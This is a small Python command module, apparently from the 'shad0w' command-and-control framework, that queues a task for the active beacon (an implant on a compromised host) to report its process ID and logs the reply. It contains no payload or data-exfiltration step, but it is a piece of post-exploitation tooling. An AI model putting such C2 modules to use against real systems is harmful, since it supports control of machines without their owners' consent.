#
# Get the current pid info
#
import json

__description__ = "Get the current process info"
__author__ = "@_batsec_"

EXEC_ID    = 0x4000
OPCODE_PID = 0x7000

def pid_callback(shad0w, data):
    shad0w.debug.log(data, log=True, pre=False)

    return ""

def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return

    # make the json
    data = {"op" : OPCODE_PID, "args": "null"}
    data = json.dumps(data)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["callback"] = pid_callback
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, data)